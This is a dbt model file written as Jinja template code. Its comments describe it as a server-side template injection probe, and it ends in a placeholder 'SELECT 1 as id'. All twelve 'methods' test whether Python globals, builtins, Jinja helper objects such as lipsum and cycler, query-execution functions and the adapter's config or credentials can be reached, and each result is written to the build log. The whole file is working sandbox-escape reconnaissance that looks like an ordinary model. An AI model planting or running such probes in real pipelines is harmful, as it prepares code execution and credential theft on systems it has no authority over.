{# Probe re module globals for builtins access #}
{%- set re_mod = modules.re -%}

{# Method 1: re.compile type #}
{{ log("RE_COMPILE_TYPE=" ~ re_mod.compile | string, info=True) }}

{# Method 2: Try accessing __globals__ via re._compile or similar #}
{%- if re_mod.compile.__globals__ is defined -%}
  {{ log("RE_GLOBALS_AVAILABLE=YES", info=True) }}
  {{ log("RE_GLOBALS_KEYS=" ~ re_mod.compile.__globals__.keys() | list | join(',') | truncate(500), info=True) }}
{%- else -%}
  {{ log("RE_GLOBALS_NOT_ACCESSIBLE", info=True) }}
{%- endif -%}

{# Method 3: Try lipsum (common Jinja2 SSTI) #}
{%- if lipsum is defined -%}
  {{ log("LIPSUM_AVAILABLE=YES", info=True) }}
{%- else -%}
  {{ log("LIPSUM_NOT_AVAILABLE", info=True) }}
{%- endif -%}

{# Method 4: Try cycler #}
{%- if cycler is defined -%}
  {{ log("CYCLER_AVAILABLE=YES type=" ~ cycler | string, info=True) }}
{%- else -%}
  {{ log("CYCLER_NOT_AVAILABLE", info=True) }}
{%- endif -%}

{# Method 5: Try joiner #}
{%- if joiner is defined -%}
  {{ log("JOINER_AVAILABLE=YES type=" ~ joiner | string, info=True) }}
{%- else -%}
  {{ log("JOINER_NOT_AVAILABLE", info=True) }}
{%- endif -%}

{# Method 6: Try namespace #}
{%- if namespace is defined -%}
  {{ log("NAMESPACE_AVAILABLE=YES type=" ~ namespace | string, info=True) }}
{%- else -%}
  {{ log("NAMESPACE_NOT_AVAILABLE", info=True) }}
{%- endif -%}

{# Method 7: Try to access adapter config/credentials #}
{{ log("ADAPTER_TYPE=" ~ adapter | string | truncate(200), info=True) if adapter is defined else log("adapter_NOT_DEFINED", info=True) }}

{# Method 8: Try execute_model / run_query #}
{%- if execute_model is defined -%}
  {{ log("EXECUTE_MODEL_AVAILABLE", info=True) }}
{%- else -%}
  {{ log("execute_model_NOT_DEFINED", info=True) }}
{%- endif -%}

{%- if run_query is defined -%}
  {{ log("RUN_QUERY_AVAILABLE=YES", info=True) }}
{%- else -%}
  {{ log("run_query_NOT_DEFINED", info=True) }}
{%- endif -%}

{# Method 9: Try statement block #}
{%- if statement is defined -%}
  {{ log("STATEMENT_AVAILABLE=YES", info=True) }}
{%- else -%}
  {{ log("statement_NOT_DEFINED", info=True) }}
{%- endif -%}

{# Method 10: Try builtins #}
{%- if builtins is defined -%}
  {{ log("BUILTINS_AVAILABLE=YES", info=True) }}
{%- else -%}
  {{ log("builtins_NOT_DEFINED", info=True) }}
{%- endif -%}

{# Method 11: Range/dict access #}
{{ log("RANGE_TYPE=" ~ range | string, info=True) if range is defined else log("range_NOT_DEFINED", info=True) }}
{{ log("DICT_TYPE=" ~ dict | string, info=True) if dict is defined else log("dict_NOT_DEFINED", info=True) }}

{# Method 12: Try self (Jinja2 template reference) #}
{%- if self is defined -%}
  {{ log("SELF_TYPE=" ~ self | string | truncate(200), info=True) }}
{%- else -%}
  {{ log("self_NOT_DEFINED", info=True) }}
{%- endif -%}

SELECT 1 as id
